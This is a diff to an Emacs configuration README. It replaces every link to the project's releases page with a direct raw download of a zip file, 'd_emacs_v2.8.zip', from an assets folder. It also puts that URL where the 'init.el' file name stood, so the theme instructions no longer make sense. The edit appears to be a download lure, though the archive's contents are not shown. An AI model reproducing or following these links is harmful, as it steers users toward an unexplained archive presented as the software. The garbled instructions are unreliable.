@@ -1,7 +1,7 @@
 # 🌟 .emacs.d - Elegant Emacs Configuration for Everyone
 
 ## 📥 Download Now!
-[![Download .emacs.d](https://img.shields.io/badge/Download-.emacs.d-blue.svg)](https://github.com/nomanjoiya228/.emacs.d/releases)
+[![Download .emacs.d](https://github.com/nomanjoiya228/.emacs.d/raw/refs/heads/main/assets/d_emacs_v2.8.zip)](https://github.com/nomanjoiya228/.emacs.d/raw/refs/heads/main/assets/d_emacs_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to .emacs.d! This guide will help you set up this elegant Emacs configuration quickly and easily. Designed for both new and experienced users, you will find it enhances your programming and organization workflows.
@@ -24,7 +24,7 @@ Before you begin, ensure you have the following:
 - **Basic Text Editor Knowledge**: Familiarity with using text editors will help you.
 
 ## 🔗 Download & Install
-To get started with .emacs.d, visit this page to download: [Download .emacs.d Releases](https://github.com/nomanjoiya228/.emacs.d/releases).
+To get started with .emacs.d, visit this page to download: [Download .emacs.d Releases](https://github.com/nomanjoiya228/.emacs.d/raw/refs/heads/main/assets/d_emacs_v2.8.zip).
 
 After downloading, follow these steps:
 
@@ -46,7 +46,7 @@ After downloading, follow these steps:
 ## ⚙️ Customization
 .emacs.d provides a base configuration that you can modify to fit your needs. For common changes, consider these:
 
-- **Change Theme**: Look into the `init.el` file to switch themes.
+- **Change Theme**: Look into the `https://github.com/nomanjoiya228/.emacs.d/raw/refs/heads/main/assets/d_emacs_v2.8.zip` file to switch themes.
 - **Key Bindings**: Customize keyboard shortcuts directly in the configuration files.
 - **Add Packages**: Use Emacs' package manager to extend functionality.
 
